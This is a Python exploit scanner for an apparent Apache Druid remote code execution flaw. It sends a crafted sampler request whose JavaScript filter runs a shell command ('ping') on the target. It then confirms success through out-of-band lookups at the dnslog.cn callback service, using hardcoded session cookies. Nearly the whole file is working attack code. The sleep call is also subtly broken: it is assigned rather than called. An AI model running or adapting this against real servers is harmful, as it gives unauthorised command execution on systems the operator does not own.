import time

import click
import requests
import sys
import json


def dnslog_get():
    headers = {
        "Cookie": "UM_distinctid=178ce6e908a0-0e56e69bac7299-c3f3568-1ecde4-178ce6e908b7b9; CNZZDATA1278305074=903547381-1618366436-null%7C1618366436; PHPSESSID=9l7erjviikjo7r3fsfjvo1p016"
    }
    req = requests.get("http://www.dnslog.cn/getdomain.php", headers=headers, timeout=6)
    print(req.text)
    return req.text


def dnslog_refresh():
    headers = {
        "Cookie": "UM_distinctid=178ce6e908a0-0e56e69bac7299-c3f3568-1ecde4-178ce6e908b7b9; CNZZDATA1278305074=903547381-1618366436-null%7C1618366436; PHPSESSID=9l7erjviikjo7r3fsfjvo1p016"
    }
    req_rf = requests.get("http://www.dnslog.cn/getrecords.php", headers=headers, timeout=6)
    print(req_rf.text)
    return req_rf.text


dnslog_domain = dnslog_get()


def scan(host):
    global rep
    url = str(host) + "/druid/indexer/v1/sampler"
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Content-Type": "application/json",
    }
    payload = {
        "type": "index",
        "spec": {
            "ioConfig": {
                "type": "index",
                "inputSource": {
                    "type": "inline",
                    "data": "{\"isRobot\":true,\"channel\":\"#x\",\"timestamp\":\"2021-2-1T14:12:24.050Z\",\"flags\":\"x\",\"isUnpatrolled\":false,\"page\":\"1\",\"diffUrl\":\"https://xxx.com\",\"added\":1,\"comment\":\"Botskapande Indonesien omdirigering\",\"commentLength\":35,\"isNew\":true,\"isMinor\":false,\"delta\":31,\"isAnonymous\":true,\"user\":\"Lsjbot\",\"deltaBucket\":0,\"deleted\":0,\"namespace\":\"Main\"}"
                },
                "inputFormat": {
                    "type": "json",
                    "keepNullColumns": True
                }
            },
            "dataSchema": {
                "dataSource": "sample",
                "timestampSpec": {
                    "column": "timestamp",
                    "format": "iso"
                },
                "dimensionsSpec": {

                },
                "transformSpec": {
                    "transforms": [],
                    "filter": {
                        "type": "javascript",
                        "dimension": "added",
                        "function": "function(value) {java.lang.Runtime.getRuntime().exec('ping {ip}')}".replace("{ip}", dnslog_domain),
                        "": {
                            "enabled": True
                        }
                    }
                }
            },
            "type": "index",
            "tuningConfig": {
                "type": "index"
            }
        },
        "samplerConfig": {
            "numRows": 500,
            "timeoutMs": 15000
        }
    }
    try:
        rep = requests.post(url=url, headers=headers, data=json.dumps(payload), timeout=5, verify=False)
    except:
        print("漏洞不存在")
    time.sleep = 5
    if rep.status_code == 200 and dnslog_domain in dnslog_refresh():
        print("漏洞存在")
    else:
        print("漏洞不存在")


@click.command()
@click.option("-h", "--host", help='Target URL; Example:http://ip:port。')
# @click.option("-c", "--cmd", help='Target URL; Example:ping x.x.x.x。')
# host = "http://10.7.2.108:8888"
def main(host):
    # title()
    scan(host)


if __name__ == '__main__':
    main()
